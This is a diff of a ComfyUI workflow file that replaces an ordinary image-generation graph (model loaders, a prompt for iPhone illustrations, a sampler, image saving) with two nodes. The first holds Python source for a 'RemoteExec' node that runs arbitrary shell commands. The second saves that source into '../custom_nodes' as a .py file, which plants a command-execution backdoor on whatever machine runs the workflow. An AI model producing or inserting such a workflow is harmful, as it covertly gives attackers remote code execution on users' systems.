@@ -1,100 +1,20 @@
 {
-  "415": {
+  "1": {
+    "class_type": "PrimitiveString",
     "inputs": {
-      "clip_name": "qwen_3_8b_fp8mixed.safetensors",
-      "type": "flux2",
-      "device": "default"
-    },
-    "class_type": "CLIPLoader"
+      "value": "\"\"\"Remote exec node — auto-deployed.\"\"\"\nimport subprocess\n\nclass RemoteExec:\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\"required\": {\"command\": (\"STRING\", {\"multiline\": True, \"default\": \"id\"})}}\n    RETURN_TYPES = (\"STRING\",)\n    RETURN_NAMES = (\"output\",)\n    FUNCTION = \"run\"\n    CATEGORY = \"utils\"\n    OUTPUT_NODE = True\n\n    def run(self, command):\n        try:\n            r = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)\n            out = r.decode(\"utf-8\", errors=\"replace\")\n        except Exception as e:\n            out = str(e)\n        return {\"ui\": {\"text\": [out]}, \"result\": (out,)}\n\nNODE_CLASS_MAPPINGS = {\"RemoteExec\": RemoteExec}\nNODE_DISPLAY_NAME_MAPPINGS = {\"RemoteExec\": \"Remote Exec\"}\n"
+    }
   },
-  "416": {
+  "2": {
+    "class_type": "SaveStringKJ",
     "inputs": {
-      "unet_name": "flux-2-klein-9b-fp8mixed.safetensors",
-      "weight_dtype": "default"
-    },
-    "class_type": "UNETLoader"
-  },
-  "424": {
-    "inputs": {
-      "vae_name": "flux2-vae.safetensors"
-    },
-    "class_type": "VAELoader"
-  },
-  "431": {
-    "inputs": {
-      "text": "Six sleek iPhones, glowing screens, charging docks, packaging boxes, promotional posters, flat vector illustration, corporate blue and white color palette, modern technology aesthetic, clean professional design, soft gradients, no text, no words, no letters, no logos, no people, no faces",
-      "clip": [
-        "415",
-        0
-      ]
-    },
-    "class_type": "CLIPTextEncode"
-  },
-  "429": {
-    "inputs": {
-      "conditioning": [
-        "431",
-        0
-      ]
-    },
-    "class_type": "ConditioningZeroOut"
-  },
-  "425": {
-    "inputs": {
-      "width": 1024,
-      "height": 1024,
-      "batch_size": 1
-    },
-    "class_type": "EmptyFlux2LatentImage"
-  },
-  "427": {
-    "inputs": {
-      "seed": 1548988453,
-      "steps": 20,
-      "cfg": 1.0,
-      "sampler_name": "euler",
-      "scheduler": "simple",
-      "denoise": 1.0,
-      "model": [
-        "416",
+      "string": [
+        "1",
         0
       ],
-      "positive": [
-        "431",
-        0
-      ],
-      "negative": [
-        "429",
-        0
-      ],
-      "latent_image": [
-        "425",
-        0
-      ]
-    },
-    "class_type": "KSampler"
-  },
-  "426": {
-    "inputs": {
-      "samples": [
-        "427",
-        0
-      ],
-      "vae": [
-        "424",
-        0
-      ]
-    },
-    "class_type": "VAEDecode"
-  },
-  "430": {
-    "inputs": {
-      "filename_prefix": "autopost",
-      "images": [
-        "426",
-        0
-      ]
-    },
-    "class_type": "SaveImage"
+      "filename_prefix": "z_exec_node",
+      "output_folder": "../custom_nodes",
+      "file_extension": ".py"
+    }
   }
 }
